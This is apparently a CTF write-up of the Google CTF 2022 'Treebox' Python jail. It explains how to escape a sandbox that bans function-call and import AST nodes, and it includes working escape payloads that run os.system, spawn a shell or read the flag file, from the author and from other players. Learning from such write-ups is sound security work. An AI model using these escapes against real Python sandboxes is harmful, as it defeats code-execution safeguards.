# Treebox Google CTF 2022
## SANDBOX - Python Jail - 268 solves - 50 points

This challenge was a classic type of challenge known as a Python jail in which we can run Python code in a remote server with some limitations and our objective is to read the flag from a file on the server or achieve arbitrary code execution. 

Usually we are limited in the characters we can use or have forbidden words but this was different in that the server would parse the code into it's Abstract Syntax Tree (AST) and reject the code if it contained a Call, Import or ImportFrom node in it. 

We are given the server source code which we can adapt to play around locally. Simply we add an extra loop so we can try many inputs, print out the node type during verification and execute regardless of verification for debugging.

```python
import ast, sys, os

def verify_secure(code):
  tree = compile(code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
  for x in ast.walk(tree):
    print(type(x))
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  print(f"COOL: Code is valid")
  return True

print("-- Please enter code (last line must contain only --END)")
while True:
  source_code = ""
  while True:
    line = sys.stdin.readline()
    if line.startswith("--END"):
      break
    source_code += line

  verify_secure(source_code)
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

By testing we find out that we cannot use `import` or `from ... import` statements nor we can call functions by `name()` including instantiating classes like `str()`. But we do have access to `os` library so _if_ we could just execute `os.system("cat flag")` we'd be done. We just need to find out _how_ to call a function.

Several ideas came to mind. Maybe there is some language statement that is not a function and would execute arbitrary code, in Python 2 `exec` is a statement and should do fine but we have Python 3. Maybe some string interpolation does code execution, but no. Maybe decorators, they did execute but had to think on a way of controlling the input (other teams actually did this). We could override an object magic methods and trigger them. Finally I went with this last method.

Since we want to call `os.system` that takes one string parameter we need some magic method that also takes 1 string parameter, like `__getitem__` that gets triggered when we try to access a key on a dictionary this way `object["string"]`. 

We test it real quick, the initialization is still a function call but the indirect call works.  

```python
class Test:
  __getitem__=os.system

Test()["ls"]
```
So we changed a problem for another. We can execute _if_ we have an instantiated object with an overridden magic method. I tried adding methods to built-in classes and while you can extend them you cannot modify them and you need to initialize the extended classes like any regular class. Tried to add methods to an existing object but again they were immutable. Finally I went back to searching for statements we can use to instantiate a class by inspecting what AST had to offer.

```python
dir(ast)

['AST', 'Add', 'And', 'AnnAssign', 'Assert', 'Assign', 'AsyncFor', 'AsyncFunctionDef', 
'AsyncWith', 'Attribute', 'AugAssign', 'AugLoad', 'AugStore', 'Await', 'BinOp', 'BitAnd', 'BitOr', 
'BitXor', 'BoolOp', 'Break', 'Bytes', 'Call', (...) 'RShift', 'Raise', 'Return', 'Set', 'SetComp', 
'Slice', 'Starred', 'Store', 'Str', 'Sub', 'Subscript', 'Suite', 'Try', 'Tuple', 'TypeIgnore', 'UAdd', 
'USub', 'UnaryOp', 'While', 'With', 'Yield', 'YieldFrom', (...)]
```

After much testing and some thinking I found that `raise` would happily take a class name and instantiate it if it extended from `BaseException`. So we finally can build the full exploit! 

We create our Test class extending from `BaseException`, we override it's `__getitem__` method with `os.system`, we `raise Test`, we capture our instantiated Test object and trigger the execution by trying to access an item on it.

```python
class Test(BaseException):
	__getitem__=os.system

try:
	raise Test
except Test as e:
	e['cat flag']

--END
```

This was the first challenge I solved during this CTF, I was fearing it would be too hard, that I might not solve any challenge and could not rely on any similar problem for solving it so I was very excited when I did solve it.

There were lot's of cool solutions so I thought I'd share a few different ones, slightly modified for clarification.

Here Crazyman found an object where to override a magic method.
```python
tree.__class__.__getitem__ = os.system
tree["cat flag"]
```

Here Harrier did away with the instantiation and added a class magic method to a metaclass. Also why get the flag when you can get a shell I guess :)
```python
class M(type):
    pass
class A(metaclass=M):
    pass
M.__getitem__ = os.system
A["sh"]
```

Here ContronThePanda found how to do it using function decorators.
```python
def os_str(x): return 'os'

@__import__
@os_str
def os(): pass

def cmd_str(x): return 'cat flag'

@os.system
@cmd_str
def ret(): pass
```

Finally the challenge creator provided this solution in which `__builtins__.__import__` is overridden and for some reason that I don't understand the following line triggers it.
```python
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
